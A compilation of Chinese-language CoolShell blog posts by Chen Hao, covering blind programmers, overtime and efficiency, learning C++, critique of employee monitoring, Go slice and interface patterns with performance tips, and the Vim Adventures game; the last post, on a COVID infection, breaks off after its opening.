第一个答案的回复人是Jared（其在StackOverflow上的积分有将近14K），但是你能想得到他是一个盲人吗？他回复到——> 我是一个完全失明的大学学生，我做过一些程序员的实习工作，所以我的回复基于我的这些经历。我使用Windows XP 和 > Jaws > 来为了读出屏幕上的内容。 > > 对于Java 编程，我使用eclipse这个强大的IDE。我使用SWT开发GUI。对于.NET编程，其使用Visual Studio > 2005，使用Jaws可以非常容易地操作VS2005，而且其还有一些很不错的脚本来可容易地用来做表单设计。 > > 对于C/C++，我使用cygwin + gcc 也使用emacs 和 vim > 做出编辑器（使用Emacspeak虽然有时候有点迟钝）。在实习过程中，我做了很多和Z/OS相关的编程工作。我使用rlogin通过cygwin登录大型机的USS系统，并使用C3270作为其3270仿真器来访问大型机的ISPF部分。 > > 我依赖于合成语音系统，也需要 Braille display， 我发现使用合成语音系统很快，但是使用 Braille > display有时候有些问题。比如程序有太多的嵌套括号。
关于Braille display，又叫盲文显示机，是能以盲文进行输出的电子机械式设备。一般来说，该设备通过在平坦表面上打孔来实现点阵的表现。有了该设备的帮助，无法使用一般的显示设备的失明用户也能够阅读文字。如下所示。!A woman using a braille display with a QWERTY keyboard, attached to a laptop computer.第二个答案是Saqib提供的，其个人主页是，目前在Microsoft的Bing项目组，他回答到：> 我是盲人，我对Windows, Mac, Linux 和 DOS有13年的编程经验了，我会的编程语言是C/C++, Python, Java, > C#或是其它相似的语言，虽然问题问的是怎么来设置盲人的环境，但是我想从盲人怎么使用电脑来回答。 > > 有些人使用“语音环境”，如T. V. Raman程序员和Emacspeak > 环境。这样的环境需要有读屏程序来监控操作系统的行为，并通过合成语音系统或是Braille display > 来告诉盲人屏幕上有什么。这样一样，盲人就可以操作任何的应用程序了。 > > 我个人这段时候使用Visual Studio > 2008（注：作者是09年回的这个贴的），用其来做一些修改。我关闭了一些VS2008的功能，如显示错误，因为这会让我分心。在加入微软以前，我都是在用notepad这样的东西开发程序。 > > > 对于读屏软件，我需要设置一下，以便其告诉我缩进。老实说我不太关心这个事，因为VS2008对程序缩进做得很好。但是对于Python来说，这个功能相当重要。最终，Emacspeak > 可以使用不同的声音来让我区分缩进的语句块，以及一些语法（关键词，注释，标识，等等。）
对于Saqib，大家有兴趣可以看看他的视频访谈：Saqib Shaikh and Scott Hanselman: Designing for Accessibility这个问题中多次提到了Google的盲人程序员 T.V. Raman，我在网上搜了一下他，他前段时间来过北京，新京报在今年早期报道过他——《T.V 拉蒙，互联网界也有“盲剑客” ——Google盲人工程师讲述软件设计之路》在这篇报道中，他经历过IBM, Adobe和Google 这三个公司，他可以在23秒内复原盲人魔方，1989年他就得到一台给盲人用的语音合成器和当时最先进的读屏软件。他现在使用电脑 没有任何障碍，他天天都上网浏览信息，他还可以使用特别的手机来看地图。不知道你看完这些人的经历后，你有什么感觉？* 你是否会觉得技术的力量和社会的尊重让他们和正常人一样可以使用电脑？   * 你是否会觉得我们这些正常人是不是平时抱怨的太多了呢？还有什么理由不努力的呢？（全文完）# 加班与效率作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn微博上看到了这么一个贴子，就像以前在《腾讯，竞争力 和 用户体验》中批评过腾讯说自己的核心竞争力是员工加班一样，我顺着Winter的回复也批评了一下这个微博——
“靠加班超越对手？！劳动密集型么？我要是对手的话，我就来趁机挖人了，直接摁死你……//@寒冬winter: 当一个管理者的智慧无法衡量一支团队的产出的时候，他就会把“工时”当做最后的救命稻草，死死抱住——这是他唯一听得懂的东西了。”然后，@玄了个澄的在微博里at我说，他在微信里看了@Fenng 关于加班的言论，希望我评论一下。我看了一下大辉的文章，虽然写得有点散乱，但是我和他的一些观点还是很类似的，我主要在这里加强一下我的看法。#### 关于加班**认为加班是公司的核心竞争力，或是超越对手的手段，是一种相当 Ridiculous 的想法。这说明管理者们已经想不到自己公司的核心价值了** 。是的，这些靠堆功能没有灵魂的产品的价值就只剩下比谁跑得快了。他们愚蠢和思维有限的大脑里已经区分不出来，“跑得快”和“跑得好”的差别了。产品的发展不是短跑，而是长跑，甚至更像是登山，登山比的不是快，而比的是策略，比的是意志，目的是登顶。并不是谁一开始爬得快谁就能最先登顶的，你往往被超越的时候都在后半程。对于一些危险的雪山来说，登顶的人通常都是要做好非常很充分的准备，并且在登山的过程中学会如何保留体力，学会如何步步为营的，从来不强行登顶。
在《Rework》摘录及感想 中提到过两点* **条件受限是好事，因为条件受限可以让你小材大用，让你没有办法再用蛮力来完成工作，让你必需去思考使用知识密集型的解决方案来更聪明的解决问题** 。* **工作狂往往不得要领。他们花大把大把的时间去解决问题，他们以为能靠蛮力来弥补思维上的惰性，其结果就是折腾出一堆粗糙无用的解决方案** 。就像人肉手动的织布机一样，当面对大量订单的时候，一个简单粗暴的方法就是拼命地加人和拼命地工作来换取更大的生产力。只有你在人手不够或是人力成本太高的情况下，你才会去想是不是可以优化一下工具，制造一个更有效率更有生产力的工具。**在中国，劳动力的成本不高，而管理者们的智力和能力有限，所以，在这个环境下，尤其在KPI和数字的重压下，管理者们是非常非常容易想到需要靠加人或是加班来提高产能的** 。所以，他们放弃了知识密集型的创新，而采用了劳动密集型的简单粗暴的方式，长期下来，导致了自己再也不会思考，导致了只会使用人肉解决问题。于是，当全自动化的织布机出现的时候，这种劳动密集型的公司分分钟就成为了历史。这样的例子太多太多了，看看历史就知道了。当然，有时候，我们需要冲刺还是要适当偶尔加班的，但这绝对不应该是常态和长期的，不然，这必然是一种饮鸩止渴的行为。
另外，我还要多说几种情况：1）如果你的员工就像在《软件公司的两种管理》中所说的，像Widget Factories那样，净是些X型的人的话，那么，你也只有使用加班和加人这种方式，就像长城和金字塔的建设过程一样，就像富士康一样，你的团队本质是不会思考只能用鞭子去抽他们的方式去管理。于是，你也只能用“狼性”来呼唤你的员工像那些低智商的野兽一样的行事。2）有时候，我们需要去“卡位”，需要很快地去实现一个东西占领市场，这需要加班。就像Win95和Intel的奔腾芯片的浮点数问题一样。但是千万不要忘了，你在卡完位后，得马上把你产品的质量搞上去，不然，你一样会死得很难看。（Windows是有两个团队的，一个团队是用来占领市场的，另一个团队是安心搞发展的）注意：“卡位”从某种程度上来说应该是一种有价值的事，但我们依然要思考是否在用蛮力行事。3）另外，有的人工作就是生活，生活就是工作，所以，对他来说，这不是一种工作，而是一种事业。我认可这样的精神和热情，但是，我还是想让这样的人反思一下自己，有没有用一种更为聪明的方式来从事自己的事业？而不是用蛮力。无论上述的哪种情况，我们都可以看到，只要你进入了劳动密集型，靠人和靠加班来解决问题，并沉迷并深 陷其中不能自拔，那们，你终有一天会玩到尽头的。
#### 关于效率**很多人不知道什么叫效率，他们以为效率就是：单位时间单位人数下干更多的活。这是错的！效率不是比谁干的活多，而是比谁干得活有更大的价值** 。效率的物理公式是： **有用功/总功** 。换句话说，效率就是：单位时间和人数产生的价值。所以，提高效率，并不是加人，也不是干更多的活，而是，你这么多人干出来了多少有价值的东西。有了公式，我们也就知道怎么来提高效率了。**1）增加有用功*** 你得多问问你的需求方，为什么要加这个需求？干这个事到底有多大的价值？能让多少人受益？   * 你得多问问你的需求方，能不能稍微简化一下需求，这样可以让我付出的努力更少一些？   * 你得要多去思考一下，你是在干一个建筑队的活呢？还是在干一个装修队的活？   * 你得要多去思考一下，业务上和用户的最大的痛点是什么？关于增加有用功，再说两点：* 像乔布斯那样，告诉你的产品经理或是业务方，你现在提的10需求，我只能做3个，会是哪3个？为什么是这3个？ **有用功的来源不是拼命做需求，而是砍需求。*** **关于创造价值，我们要干的不是像百度的“竞价排名”那样，把钱从别人口袋里搬运到自己的口袋里，而是要像“英国工业革命”或是“硅谷”那样，把价值真正的创造出来** 。
**2）降低总功*** 你得多问问自己，你有多少时间是在干一些支持性而不是产出性的工作？   * 你得多问问自己，有没有残酷无情地减少重复劳动的劳动密集型的工作？   * 你得多问问自己，自己的管理者和员工的能力和素质有没有在降低你的团队执行的成本？**3）形成合力**有一个很不错的产品经理对我说，他看了南京那两个小女孩被饿死的消息，感到很震惊。与之有关联的每一方都说自己尽力，但是最终结果人还是饿死了，你几乎不敢相信这是真的。但是，类比一下我们的项目，这种事似乎又发生在我们的公司当中，尤其是大公司中。每一个团队都说自己尽力了，结果项目就是没做好，底层团队说自己只干底层，已经尽力了，前端说自己只负责前端，也尽力了，后端说自己只管后端，不管前端和底层，运维说对于这样的设计和部署自己也尽力了，产品经理，运营都这样说，自己尽力了。你会发现，你几乎很难批评他们，因为他们的确如他们所说的那样，把他们自己的那块都做得很好了，而且的确做得很好了。但是，最终的结果却是：整个产品问题很多。**所以说，效率不是每个团队各自的效率，而是整个团队对整个产品负责的共同使命，这样才会现整体的效率。没有整体的效率，只有个体的效率，最终也等于没有效率** 。
#### T-Shirt Size EstimationAmazon用一种T-Shirt Size 估计的方式来做项目。* 产品经理会对每一条需求评估上业务影响力的尺寸，如：XXXL 影响一千万人以上或是可以占到上亿美金的市场，XXL，影响百万用户或是占了千万金级别以上的市场，后面还有XL，L，M，S，这样下来。* 开发团队也一样，要评估投入的人员时间成本，XXXL表示要干1年，XXL干半年，XL干3个月，L干两个月，M干一个月，S干两周以下。等等。于是，* 当业务影响力是XL，时间人员成本是S，这是最高优先级。   * 当业务影响力是M，时间人员成本是M，这是低优先级。   * 当业务影响力是S，时间人员成本是XL，直接砍掉这个需求。因为是亏的。   * 当业务影响力是XXL，时间人员成本是XXL，需要简化需求，把需求简化成XL，时间人员成本变成M以下。大家感受一下吧。好了，我就说这么多，欢迎大家讨论。（全文完）# “第六感装置”的惊人潜力作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn我们总是在于“现实生活”和“电脑的数字生活”中的差异，这两个世界难道不可以合并吗？美国MIT Media Lab（麻省理工学院媒体实验室）的天才学生普拉纳夫- (Prarnav Mistry)，发明了一项结合实体世界和虚拟世界的科技，令人惊喜，感叹创造力的惊人。下面是视频。翻译还OK。
# 如何学好C++语言作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn昨天写了一篇如何学好C语言，就有人回复问我如何学好C++，所以，我把我个人的一些学习经验写在这里，希望对大家有用。首先，因为如何学好C语言中谈到了算法和系统，所以这里就只谈C++语言。* **C++是最难的语言** 。这个世界上最难的编程语言可能非C++莫属了。你千万不要以为几天就可以学好C++，C++的学习曲线是相当BT的，你可以看看这篇文章。C++是一门很自由的语言，自由到了有点BT和恐怖的地步。我甚至认为C++并不是一门成熟的编程语言，因为太容易犯错了。所以， **你一定要在一开始就要有很小心谨慎的态度，并把C++当成一种难以训服的猛兽来看待** 。* **多问“为什么要这样”的问题** 。学习C++一定要多问几个“为什么是这样”，“凭什么要这样”的问题。比如：很多人知道C++有拷贝构造函数和初始化列表，但你真的知道为什么要有拷贝构造函数？为什么要有初始化列表吗？为什么要有template，为什么要有RTTI，为什么不是别的呢？难道就是为了让一门语言变得Cool一些吗？完全不是这样的，C++中的任何一个feature都有些实实在在的原因， **你一定要去了解为什么要把C++设计成这样的原因，你才能学好C++** 。有空看看《C++演化和设计》一书。
* **看书，大量的C++书** 。你可以按如下先后顺序阅读（下面这些书，我花了大约4-5年的时间，今天我还在随时温习）      * 《C++ Primer》，这本初级读本可能让会你啃得很痛苦，所有的语言的特性和为什么都在里面了，好好读读。当然由C++之父写的《C++程序设计语言》也不错。两本看一本就好了（我看的是前者）。     * 了解C++的语法仅仅是万里长征的第一步，你还需要看看《Effective C++》和《More Effective C++》这两本书并不厚，但我从02年就一直看到现在，每次读我都有新的体会，这两本书太经典了。如果你对C语言不熟，这两本书会让你回去补C语言的课。     * Think in C++同样是另一本经典之极的书，学c++必读，但是中文版的翻译的很不好，所以还是去读英文版的吧。     * 《C++沉思录》同样非常值得一读，这里教的不是编程，而是思考的方法，这是相当珍贵的。     * 《Exceptional C++》和《More Exceptional C++》让你看看各种问题的解决方法和一些常见的经典错误。     * 《Advanced C++》和《Modern C++》可以让你知道C++各种神奇的用法。     * 《泛型编程与STL》是把C++实践到了极致的东西。很强大。STL——神一样的模板库（容器，算法和函数对象），不得不服。     * 《深入探索C++对象模型》让你了解编译器下的C++是什么样的，让你了解C++的性能并不差。这个对于C++的程序员太关键了。我以前写过的《C++虚函数表解析》还有《C++对象内存布局》属于这个范畴。
* **和Java语言做对比** 。我个人以为Java对C++这个并不成熟的语言做了很多调整，规范和限制。所以，对比一下Java和C++，想一想，为什么一些东西在C++中可以做，但在Java中却不行。比如：Java的异常是必需要catch的，不然就会编译不通过。为什么Java不提供操作符重载？为什么Java会引入接口来做多重继承？为什么Java没有像C++那样的I/O字符流？为什么Java不支持指针？为什么Java可以做到垃圾回收？等等。 **Java体现着很多面向对象设计的东西，学习Java有助于你学会怎么更好地使用C++来编程** 。* **面向对象设计** 。虽然面向对象可能是个骗局。但是我觉得面向对象设计中的一些实践非常的不错，比如，单一原则，依赖倒置原则，等等，都非常地经典。《设计模式》必需一读，《面向对象的分析和设计》可以一读。 **但不可以设计模式为中心来编程，而应该是用设计模式来解藕** 。* **类库学习** 。看看MFC是怎么封装Windows API的，看看ACE是怎么面向对象的，看看boost是怎么玩面向对象的，看看CPPUnit又是怎么设计的。当然，Java的JDK中有太多的设计模式，可以参考。
希望没有吓到大家，并欢迎大家补充。_**—————更新 2011/03/30 19:20————**_更新几个观点：* 1）我不擅长写书评，所以推荐的这些书可能会让你有点看点没有感觉，你可以上豆瓣或是China-pub上看看书评。   * 2）C++有很多奇淫技巧，有的很BT，包括虚函数表，也许会有人觉得有点没意思，但我觉得很有意思，一方面可以了解一门语言的实现细节，另一方面可以开阔思路。我从学习这些知识中受益很多。   * 3）上述是我的个人的学习历程，我觉得对我很有效，所以是经验之谈。   * 4）这类的文章在网上有很多很多，我不是第一个写这样的文章，我也不是写得最好的，我并不希望用长篇大论来谈论什么。只是想给大家了解一下大概的学习样子。毕竟，C++博大精深，任何一篇文章都无法说好。不如就简单一些。*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# 谈谈公司对员工的监控作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn今天看到微博上有一个热点事件， 是一个关于某公司做的一个监控员工离职倾向的软件，从截图中可以看到员工访问招聘网站的次数，还有投递的简历以及搜索的关建词等等信息，通过这些信息分析员工的离职倾向。然后我发一个微博，说了一下，我以前工作过的公司无论外国公司还是中国公司都有这样的情况，收到一些人来问我相关的情况，所以，我想还是写篇文章详细地说一下，我对这种事情的看法。
本文分成下面个部分：* 公司监控员工的技术手段有哪些？   * 为什么要监控员工？   * 外企和国企有什么不一样？   * 我对此事的看法目录* 技术手段   * 公司监控的目的   * 外企与国企不同之处   * 我对此事的看法#### 技术手段下面是我经历过的几个手段：1） **通过网络嗅探的方式** 。也就是说，你只要上了公司的网络，你个人设备上的通讯信息就可以被人以网络抓包+分析的方式进行分析。当然，这样的手段已经不怎么好用了，因为现在的网络基本上都是HTTPS加密的，网络嗅探的方式只能知道你访问了什么IP，对于其中的数据是没有办法知道的。2） **通过使用公司提供的软硬件工具** 。你使用公司的电子邮箱，浏览器（或是公司的代理服务器），通讯工具（包括语音电话），手机办公应用……等来处理你的个人事宜的时候，必然会被监控。这样，你只需要不要使用公司的软件来处理自己的私事就好了。3） **通过安装一个监控程序** 。这个是最可怕的了，因为无论你加不加密都没用了。一般来说，你不安装这个程序，你就没有办法连上网络，包括公司内网和外网。这个监控程序，会收集你电脑或手机上能够收集的到的所有的信息，比如，你的网络信息，按键操作，录屏，软件数据……等等。
4） **办公区监控** 。我见过的还有使用摄像头，在会议室中安装声音和视频监控设备，对整个办公区内发生所有的事情进行监控。**5）通过爬虫。** 通过爬虫分析员工的社交平台上的各种言论，包括招聘网站。除了公司需要分布和自己相关的舆情，同样也开始监控员工的行为和价值观等。这已经不是监控隐私信息了……#### 公司监控的目的公司监控的目的最早就是为了防止自己公司内的数据和信息外泄，所以，他们害怕自己的员工访问了什么不合适的网站，或是下载了什么有恶意的软件，或是不小心发错了邮件。另外一些公司也会使用外包人员，所以，对于外部编制的人员更需要有信息泄漏防范的安全需求。当然，也害怕有一些商业间谍或是自己的员工被收买了窃取公司内部的敏感信息。尤其是对于一些本身就是做数据的公司，如我以前呆过的Thomson Reuters，这家公司主要是卖金融数据的，所以，对信息泄漏是非常注重的，其就是需要在员工的电脑上安装监控软件。还有一些劳动密集型的工作，比如在Amazon里的仓库里工作的人，公司会监控员工的工作量，以此来评估员工的工作绩效。对于用监控软件来评估程序员的工作量，我到今天仅见过监控外包人员的，在中国，外包人员需要使用甲方的电脑进行签到和签退，以及相关的工作。除了上述的信息安全目前，还能够看到员工的工作时长的情况。
**所以，一般来说，公司监控的目的主要是为了自己的信息安全，还有员工的工作量评估，一般来说，不会涉及员工的隐私** 。但是，随着收集的数据越来越多，有些公司发现还可以做更多的事，比如，上述的员工离职倾向的分析。 **还有一些公司还会收集员工在外网的数据，比如你在社交平台上的各种言论，来分析你对公司的忠诚度和你的价值观取向……** 我个人觉得这些已经令人不耻了。#### 外企与国企不同之处我经历过的公司中，外国公司和中国公司都有监控的经历，这里说一下他们的不一样之处。 **最大的不一样的地方是，外国公司会让你有知情权，而中国公司则完全没有** 。我记得我进入Thomson Reuters 公司的时候，公司要求签署一份监控的知情的同意书，其中用中英文写的，就是说，你授权公司监控你的如下这些信息：1）上网记录，2）下载的软件，3）工作电脑，4）公司的座机电话，5）会议室和办公区的语音和视频监控……大概有两页A4纸，然后也说明了这些数据公司仅用于信息安全的风控，不用于个人隐私分析等等……并且会符合法律要求保护员工的这些数据不外泄……这些条款都经得起法律的推敲。这样的协议是需要员工签字的，并且对双方都有法律约束的。
中国的公司则不会告诉你他们会监控你哪些数据，而这些数据拿来做什么。 我记得我在某公司工作的时候，就有员工发现自己访问自己的gmail的录屏被公司收集后的愤怒……#### 我对此事的看法一方面，我对于公司通过使用监控软件监控员工的行为我是能够理解的，但是， **应该让员工有知情权，并和员工明确一个监控的信息和范围，包括收集的数据的用途和安全措施，以及数据多长时间销毁的协议。** 如果没有这个协议的话，我觉得本质上就是一种流氓行为。另一方面，针对监控员离职的倾向来说，我实在不知道有什么意义？公司你知道了又能如何呢？你是要找员工作思想工作，还是要给员工更好的待遇，还是直接开掉？ **如果你对自己的企业有信心，你就不必担心员工会离开，如果你的企业有问题，你为什么不把心思花在建设自己的企业上来呢？安装这样的监控软件对于企业没有什么帮助，反而只会让你的企业的形象更low……**再仔细想想， **员工有一万种方法泄漏你公司的信息，无论你怎么监控，只要他想，他总是能够找到方法的，不是么？如何让找到或是培养有职业操守的员工，如何管理自己企业的商业信息，如何建立一个更好的企业文化让员工更有归属感，成为企业的共同体，一同维护共同利益，为企业着想，这不才是公司真正应该干的事吗？！** 监控员工充分暴露了这样的企业没有一个好的企业文化，不懂得高级的管理，所以，只能靠监控这样的手段来管理企业了……这样的企业不去也罢了。
（全文完）# Go编程模式：切片，接口，时间和性能作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn在本篇文章中，我会对Go语言编程模式的一些基本技术和要点，这样可以让你更容易掌握Go语言编程。其中，主要包括，数组切片的一些小坑，还有接口编程，以及时间和程序运行性能相关的话题。### 本文是全系列中第1 / 10篇：Go编程模式* Go编程模式：切片，接口，时间和性能   * Go 编程模式：错误处理   * Go 编程模式：Functional Options   * Go编程模式：委托和反转控制   * Go编程模式：Map-Reduce   * Go 编程模式：Go Generation   * Go编程模式：修饰器   * Go编程模式：Pipeline   * Go 编程模式：k8s Visitor 模式   * Go编程模式 ： 泛型编程下一篇文章 »目录* Slice   * 深度比较   * 接口编程   * 接口完整性检查   * 时间   * 性能提示   * 参考文档#### Slice首先，我们先来讨论一下Slice，中文翻译叫“切片”，这个东西在Go语言中不是数组，而是一个结构体，其定义如下：
type slice struct {     array unsafe.Pointer //指向存放数据的数组指针     len   int            //长度有多大     cap   int            //容量有多大     }用图示来看，一个空的slice的表现如下：熟悉C/C++的同学一定会知道，在结构体里用数组指针的问题——数据会发生共享！下面我们来看一下slice的一些操作foo = make([]int, 5)     foo[3] = 42     foo[4] = 100bar  := foo[1:4]     bar[1] = 99对于上面这段代码。* 首先先创建一个foo的slice，其中的长度和容量都是5   * 然后开始对foo所指向的数组中的索引为3和4的元素进行赋值   * 然后，对foo做切片后赋值给bar，再修改bar[1]通过上图我们可以看到，因为foo和bar的内存是共享的，所以，foo和bar的对数组内容的修改都会影响到对方。接下来，我们再来看一个数据操作 `append()` 的示例a := make([]int, 32)     b := a[1:16]     a = append(a, 1)     a[2] = 42
上面这段代码中，把 `a[1:16]` 的切片赋给到了 `b` ，此时，`a` 和 `b` 的内存空间是共享的，然后，对 `a`做了一个 `append()`的操作，这个操作会让 `a` 重新分享内存，导致 `a` 和 `b` 不再共享，如下图所示：从上图我们可以看以看到 `append()`操作让 `a` 的容量变成了64，而长度是33。这里，需要重点注意一下—— **`append()`这个函数在 `cap` 不够用的时候就会重新分配内存以扩大容量，而如果够用的时候不不会重新分享内存！**我们再看来看一个例子：func main() {     path := []byte("AAAA/BBBBBBBBB")     sepIndex := bytes.IndexByte(path,'/’)dir1 := path[:sepIndex]     dir2 := path[sepIndex+1:]fmt.Println("dir1 =>",string(dir1)) //prints: dir1 => AAAA     fmt.Println("dir2 =>",string(dir2)) //prints: dir2 => BBBBBBBBB
dir1 = append(dir1,"suffix"...)fmt.Println("dir1 =>",string(dir1)) //prints: dir1 => AAAAsuffix     fmt.Println("dir2 =>",string(dir2)) //prints: dir2 => uffixBBBB     }上面这个例子中，`dir1` 和 `dir2` 共享内存，虽然 `dir1` 有一个 `append()` 操作，但是因为 cap 足够，于是数据扩展到了`dir2` 的空间。下面是相关的图示（注意上图中 `dir1` 和 `dir2` 结构体中的 `cap` 和 `len` 的变化）如果要解决这个问题，我们只需要修改一行代码。dir1 := path[:sepIndex]修改为dir1 := path[:sepIndex:sepIndex]新的代码使用了 Full Slice Expression，其最后一个参数叫“Limited Capacity”，于是，后续的 `append()` 操作将会导致重新分配内存。#### 深度比较当我们复杂一个对象时，这个对象可以是内建数据类型，数组，结构体，map……我们在复制结构体的时候，当我们需要比较两个结构体中的数据是否相同时，我们需要使用深度比较，而不是只是简单地做浅度比较。这里需要使用到反射 `reflect.DeepEqual()` ，下面是几个示例
import (     "fmt"     "reflect"     )#### 接口编程下面，我们来看段代码，其中是两个方法，它们都是要输出一个结构体，其中一个使用一个函数，另一个使用一个“成员函数”。PrintPerson(&p)     p.Print()     }你更喜欢哪种方式呢？在 Go 语言中，使用“成员函数”的方式叫“Receiver”，这种方式是一种封装，因为 `PrintPerson()`本来就是和 `Person`强耦合的，所以，理应放在一起。更重要的是，这种方式可以进行接口编程，对于接口编程来说，也就是一种抽象，主要是用在“多态”，这个技术，在《Go语言简介（上）：接口与多态》中已经讲过。在这里，我想讲另一个Go语言接口的编程模式。首先，我们来看一下，有下面这段代码：其中，我们可以看到，其使用了一个 `Printable` 的接口，而 `Country` 和 `City` 都实现了接口方法 `PrintStr()` 而把自己输出。然而，这些代码都是一样的。能不能省掉呢？我们可以使用“结构体嵌入”的方式来完成这个事，如下的代码所示，引入一个叫 `WithName`的结构体，然而，所带来的问题就是，在初始化的时候，变得有点乱。那么，我们有没有更好的方法？下面是另外一个解。
上面这段代码，我们可以看到—— **我们使用了一个叫`Stringable` 的接口，我们用这个接口把“业务类型” `Country` 和 `City` 和“控制逻辑” `Print()` 给解耦了。**于是，只要实现了`Stringable` 接口，都可以传给 `PrintStr()` 来使用。这种编程模式在Go 的标准库有很多的示例，最著名的就是 `io.Read` 和 `ioutil.ReadAll` 的玩法，其中 `io.Read` 是一个接口，你需要实现他的一个 `Read(p []byte) (n int, err error)` 接口方法，只要满足这个规模，就可以被 `ioutil.ReadAll`这个方法所使用。 **这就是面向对象编程方法的黄金法则——“Program to an interface not an implementation”**#### 接口完整性检查另外，我们可以看到，Go语言的编程器并没有严格检查一个对象是否实现了某接口所有的接口方法，如下面这个示例：我们可以看到 `Square` 并没有实现 `Shape` 接口的所有方法，程序虽然可以跑通，但是这样编程的方式并不严谨，如果我们需要强制实现接口的所有方法，那么我们应该怎么办呢？
在Go语言编程圈里有一个比较标准的作法：var _ Shape = (*Square)(nil)声明一个 `_` 变量（没人用），其会把一个 `nil` 的空指针，从 `Square` 转成 `Shape`，这样，如果没有实现完相关的接口方法，编译器就会报错：> cannot use (*Square)(nil) (type *Square) as type Shape in assignment: > *Square does not implement Shape (missing Area method)这样就做到了个强验证的方法。#### 时间对于时间来说，这应该是编程中比较复杂的问题了，相信我，时间是一种非常复杂的事（比如《你确信你了解时间吗？》、《关于闰秒》等文章）。而且，时间有时区、格式、精度等等问题，其复杂度不是一般人能处理的。所以，一定要重用已有的时间处理，而不是自己干。在 Go 语言中，你一定要使用 `time.Time` 和 `time.Duration` 两个类型：* 在命令行上，`flag` 通过 `time.ParseDuration` 支持了 `time.Duration`   * JSon 中的 `encoding/json` 中也可以把`time.Time` 编码成 RFC 3339 的格式   * 数据库使用的 `database/sql` 也支持把 `DATATIME` 或 `TIMESTAMP` 类型转成 `time.Time`   * YAML你可以使用 `gopkg.in/yaml.v2` 也支持 `time.Time` 、`time.Duration` 和 RFC 3339 格式
如果你要和第三方交互，实在没有办法，也请使用 RFC 3339 的格式。最后，如果你要做全球化跨时区的应用，你一定要把所有服务器和时间全部使用UTC时间。#### 性能提示Go 语言是一个高性能的语言，但并不是说这样我们就不用关心性能了，我们还是需要关心的。下面是一个在编程方面和性能相关的提示。* 如果需要把数字转字符串，使用 `strconv.Itoa()` 会比 `fmt.Sprintf()` 要快一倍左右   * 尽可能地避免把`String`转成`[]Byte` 。这个转换会导致性能下降。   * 如果在for-loop里对某个slice 使用 `append()`请先把 slice的容量很扩充到位，这样可以避免内存重新分享以及系统自动按2的N次方幂进行扩展但又用不到，从而浪费内存。   * 使用`StringBuffer` 或是`StringBuild` 来拼接字符串，会比使用 `+` 或 `+=` 性能高三到四个数量级。   * 尽可能的使用并发的 go routine，然后使用 `sync.WaitGroup` 来同步分片操作   * 避免在热代码中进行内存分配，这样会导致gc很忙。尽可能的使用 `sync.Pool` 来重用对象。   * 使用 lock-free的操作，避免使用 mutex，尽可能使用 `sync/Atomic`包。 （关于无锁编程的相关话题，可参看《无锁队列实现》或《无锁Hashmap实现》）   * 使用 I/O缓冲，I/O是个非常非常慢的操作，使用 `bufio.NewWrite()` 和 `bufio.NewReader()` 可以带来更高的性能。   * 对于在for-loop里的固定的正则表达式，一定要使用 `regexp.Compile()` 编译正则表达式。性能会得升两个数量级。   * 如果你需要更高性能的协议，你要考虑使用 protobuf 或 msgp 而不是JSON，因为JSON的序列化和反序列化里使用了反射。   * 你在使用map的时候，使用整型的key会比字符串的要快，因为整型比较比字符串比较要快。
#### 参考文档还有很多不错的技巧，下面的这些参考文档可以让你写出更好的Go的代码，必读！* **Effective** **Go   *** **Uber** **Go** **Style   *** **50 Shades of Go: Traps, Gotchas, and Common Mistakes for New Golang Devs   *** **Go** **Advice   ******* **Practical Go Benchmarks   ******* **Benchmarks of Go serialization methods   ******* **Debugging** **performance** **issues** **in** **Go** **programs   ******* **Go** **code** **refactoring:** **the** **23x** **performance** **hunt   **（全文完）# 游戏：VIM大冒险作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
不知道大家是否还记得“Vim简明攻略”呢？你是不是对Vim的那一大堆热键很头痛呢？现在好好，下面这个游戏是一个使用VIM热键玩的游戏。你可以在玩游戏的过程中熟悉Vim的热键。**你可以点击图片，或是图片下的网址打开这个游戏******!VIM大冒险我试玩了一下这个游戏，真的很不错，下面是一些我给的游戏攻略。* 第一关，场景一，首先是使用vim的h, j, k, l四个键来控制方向。（如果你妄图使用光标键的话，系统会出现黄色警告的）你需要使用h, j, k, l 四个方向走到图的右边，找到一把钥匙。（注意：迷宫墙上有些斜面，你可以通过斜面），找到钥匙后，钥匙会出现在你的右上角的位置，示意着你的光标要向那个方向移动，当你到达一个门的时候，会自动开门，进入第二关。* 第二关，每一关的小人都会给你一些英文提示，教你怎么玩。关于第二关，你会看到你过不去，小会提示你，那些绿草地就向我们文件中的行，你在行上按上下键，光标会在这一列上移动，如果这一下面的一行没有这么长，光标会到行尾。这个vim的特性会告诉我们如何过这一关——移到最上面的行尾（因为是最长的可以越过最下面的障碍），然后按下光标键，到最后一行时你就会发现光标已经过了阻碍。如此通过第二场景，达到一个小人后，按下键，进入第二关。
* 第三关，我们可以看到地图上有很多的字母，我们还可以看到有两个键，一个是w，一个是e，我们可以把光标移到w上吃到w后，我们就可以使用w键了——以单词为单位移动光标，这样，我们就可以吃到e了和第一把钥匙，我们按w和e我们就可以看到这两个按键都是以单词为单位移动光标的，一个是单词头，一个是单词尾（参看我以前给大家的vim按键速查卡）。然后，我们在最后一行通过单词跳跃到最右边吃到b—— 回到该单词的头，可以得到第二把钥匙。然后往上走，使用b 和 e键拿到第三把钥匙。然后就可以打开三个门通关了。!Vim Adventures 第三关Vim Adventures 第三关然后，就需要你注册才能玩了。作者说，因为需要发的邮件太多了，所以现在系统发不出邮件了，请等待。所以，不知道作者是用来收集邮件的，还是没有开发完，不过， **这个游戏的创意实在是太赞了** 。推荐给大家。**哪位会做游戏又熟Vim的朋友也能做一个？**（全文完）# 感染新冠的经历作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn写一篇与技术无关的文章，供大家参考。我住北京朝阳，从上周三开始我家一家三口陆续发烧生病，自测抗原后，都是阳性。好消息是，这个奥密克戎跟一般的病毒性感冒差不多，没什么可怕的，不过，整个过程除了发病之外还有一些别的因为感染带出来的事，大家也需要知晓，以准备好，以免造成生活的不便，更好的照顾好自己和家人。
